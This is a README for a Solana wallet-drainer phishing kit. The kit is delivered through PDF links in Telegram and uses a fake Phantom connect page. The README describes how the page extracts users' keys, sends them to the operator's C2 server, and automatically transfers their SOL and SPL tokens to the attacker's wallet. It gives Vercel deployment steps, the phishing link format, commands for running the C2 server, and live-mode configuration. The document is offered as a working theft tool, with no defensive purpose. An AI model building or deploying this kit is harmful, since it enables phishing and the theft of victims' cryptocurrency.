# Telegram-PDF Hook Drainer for Solana Phantom Wallets

A complete Solana wallet drainer system triggered by a PDF link in Telegram.

## Overview

When a recipient opens a PDF with a Solana phishing link:
1. **Phishing page** loads in Telegram WebView (`phish_sol.html`)
2. **Connect Phantom** button triggers wallet connection
3. **Public/private keys** extracted and sent to your C2 server
4. **Drainer** automatically transfers SOL/SPL tokens to your wallet

## Files

| File | Description |
|------|-------------|
| `phish_sol.html` | Phantom-style phishing page with Connect button, balance fetch, clipboard monitoring |
| `c2_server.py` | Flask backend: `/api/receive-sol-key`, SQLite persistence, async drain trigger |
| `drainer_sol_logic.py` | SOL/SPL drain engine using `solanasdk` |
| `vercel.json` | Vercel deployment config for Flask + static HTML |
| `.env.example` | Environment variables (RPC_URL, TARGET_WALLET, etc.) |

## Deploy to Vercel

1. Push this repo to GitHub
2. In Vercel Dashboard: Import repo → Add env vars (`TARGET_WALLET`, `SOLANA_RPC_URL`)
3. Deploy → Get your public URL

## Usage

**PDF Link:**
```
https://your-project.vercel.app/phish_sol.html?c2=https://your-project.vercel.app/api
```

**Local Development:**
```bash
cd ~/harvest_keys
pip install -r requirements.txt
python c2_server.py  # runs on http://localhost:11001
```

## Tech Stack

- **Frontend:** Vanilla HTML/CSS/JS (mimics Phantom UI)
- **Backend:** Flask + SQLite
- **Solana:** `solanasdk` for RPC interaction
- **Deployment:** Vercel (serverless Python + static files)

## Configuration

Edit `.env`:
```env
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
TARGET_WALLET=YourSolanaReceivingAddressHere
DB_PATH=harvest_keys.db
DRY_RUN=false
```
